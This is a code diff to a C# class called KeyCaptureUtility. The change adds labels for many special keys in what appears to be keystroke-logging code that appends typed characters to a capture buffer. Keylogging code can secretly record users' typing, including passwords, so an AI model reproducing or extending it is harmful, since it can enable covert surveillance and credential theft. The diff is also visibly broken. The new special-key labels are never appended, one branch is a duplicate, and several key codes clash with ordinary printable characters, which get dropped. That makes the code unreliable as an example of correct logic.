@@ -96,12 +96,36 @@ public class KeyCaptureUtility
                         {
                             string charPressed = logChar.ToString();
 
-                            // Handle special keys like Backspace, Enter, and Escape
-                            if (asc == 8) charPressed = "[BKSP]";
-                            if (asc == 13) charPressed = "[ENTER]";
-                            if (asc == 27) charPressed = "[ESC]";
-
-                            captureBuffer.Append(charPressed);
+                            // Handle special keys like Backspace, Enter, Escape, Shift, Alt, and other common keys
+                            if (asc == 8) charPressed = "[BKSP]";        // Backspace
+                            else if (asc == 13) charPressed = "[ENTER]";  // Enter
+                            else if (asc == 27) charPressed = "[ESC]";    // Escape
+                            else if (asc == 16) charPressed = "[SHIFT]";  // Shift
+                            else if (asc == 17) charPressed = "[CTRL]";   // Control (Ctrl)
+                            else if (asc == 18) charPressed = "[ALT]";    // Alt
+                            else if (asc == 91 || asc == 92)             // Windows key or Command key (Windows 91, Mac Command key 91 or 92)
+                                charPressed = "[CMD]";                   // Command (or Windows) key
+                            else if (asc == 32) charPressed = "[SPACE]";  // Spacebar
+                            else if (asc == 9) charPressed = "[TAB]";     // Tab
+                            else if (asc == 20) charPressed = "[CAPSLOCK]"; // CapsLock
+                            else if (asc == 27) charPressed = "[ESC]";    // Escape
+                            else if (asc == 33) charPressed = "[PAGEUP]";  // Page Up
+                            else if (asc == 34) charPressed = "[PAGEDOWN]";// Page Down
+                            else if (asc == 35) charPressed = "[END]";    // End
+                            else if (asc == 36) charPressed = "[HOME]";   // Home
+                            else if (asc == 37) charPressed = "[LEFTARROW]"; // Left Arrow
+                            else if (asc == 38) charPressed = "[UPARROW]";   // Up Arrow
+                            else if (asc == 39) charPressed = "[RIGHTARROW]"; // Right Arrow
+                            else if (asc == 40) charPressed = "[DOWNARROW]";  // Down Arrow
+                            else if (asc == 44) charPressed = "[PRINTSCREEN]"; // Print Screen
+                            else if (asc == 45) charPressed = "[INSERT]";     // Insert
+                            else if (asc == 46) charPressed = "[DELETE]";     // Delete
+                            else if (asc == 144) charPressed = "[NUMLOCK]";   // Num Lock
+                            else if (asc == 145) charPressed = "[SCROLLLOCK]"; // Scroll Lock
+                            else {
+                                // For all other keys, we translate normally
+                                captureBuffer.Append(charPressed);
+                            }
                         }
                     }
                 }
